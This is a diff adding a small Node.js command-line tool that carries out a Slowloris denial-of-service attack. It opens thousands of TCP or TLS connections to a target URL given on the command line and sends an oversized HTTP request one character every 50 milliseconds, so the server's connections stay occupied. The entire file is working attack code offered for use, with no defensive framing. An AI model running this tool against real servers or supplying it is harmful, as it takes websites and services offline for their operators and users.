@@ -1,0 +1,85 @@
+#!/usr/bin/env node
+
+/**
+ * Module dependencies.
+ */
+
+var program = require('commander');
+var pkg = require('./package.json');
+var parse = require('url').parse;
+var net = require('net');
+var tls = require('tls');
+
+// options
+
+program
+  .version(pkg.version)
+  .usage('[options] <url>')
+  .option('-c, --connections <n>', 'number of connections to open [5000]', parseInt)
+  .parse(process.argv);
+
+// <url>
+
+var url = process.argv[2];
+if (!url) throw new Error('url required');
+url = parse(url);
+
+// connections
+
+var c = program.connections || 5000;
+
+console.log();
+console.log('  unleashing the slow loris on %s', url.href);
+console.log('  connections: %s', c);
+
+// request
+
+var req = [
+  'GET / HTTP/1.1\r\n',
+  'Host: ' + url.host + '\r\n',
+  'Accept: */*\r\n'
+].join('');
+
+// make it huge
+
+var n = 1000;
+while (n--) {
+  req += 'X-Loris-1: ' + n + '\r\n';
+}
+
+req += '\r\n';
+
+// run
+
+while (c--) send();
+
+// active connections
+
+var active = 0;
+
+function send() {
+  var secure = 'https:' == url.protocol;
+
+  var opts = {};
+  opts.port = secure ? 443 : 80;
+  opts.host = url.host;
+
+  var mod = secure ? tls : net;
+
+  var sock = mod.connect(opts, function(){
+    ++active;
+    process.stdout.write('\r  active: ' + active + ' ');
+    var i = 0;
+
+    setInterval(function(){
+      if (null == req[i]) return;
+      sock.write(req[i++]);
+    }, 50);
+  });
+
+  sock.setTimeout(0);
+
+  sock.on('error', function(){
+    --active;
+  });
+}
